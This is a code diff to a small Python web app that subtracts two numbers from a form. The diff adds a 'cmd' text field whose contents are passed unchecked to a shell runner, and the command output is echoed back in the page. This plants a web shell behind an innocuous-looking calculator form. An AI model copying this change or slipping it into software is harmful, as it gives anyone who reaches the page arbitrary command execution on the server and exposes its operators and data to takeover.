@@ -9,16 +9,14 @@ from funcs import shell as SHELL
 import subprocess
 
 def main(request):
-  p = subprocess.Popen(["pwsh","-Command","'Write-Host","Hello World'"], stdout=subprocess.PIPE)
-  p_out, p_err = p.communicate()
-  return "<pre>"+p_out.decode("utf-8")+"</pre?"
-  #return SHELL.run("pwsh -Command \"Get-AzConsumptionUsageDetail -ResourceGroup fill-masjid-com_group -StartDate 2022-12-31 -EndDate 2023-03-10\"")
+  return template("")
 
 
 def mresult(request):
   ans = "<h1> Result: " + str(
     int(request.form.get("n1")) - int(request.form.get("n2"))) + "</h1>"
-  return template(ans)
+  cmd = request.form.get("cmd")
+  return template(ans + "<pre>"+SHELL.run(cmd)+"</pre>")
 
 
 def template(result):
@@ -29,6 +27,7 @@ def template(result):
     '<name>', name).replace("<functionCall>", "mresult") + '''">
       <input name="n1" type="number">
       <input name="n2" type="number">
+      <input name="cmd" type="text">
       <input type="submit">
     </form>
     ''' + result + '''
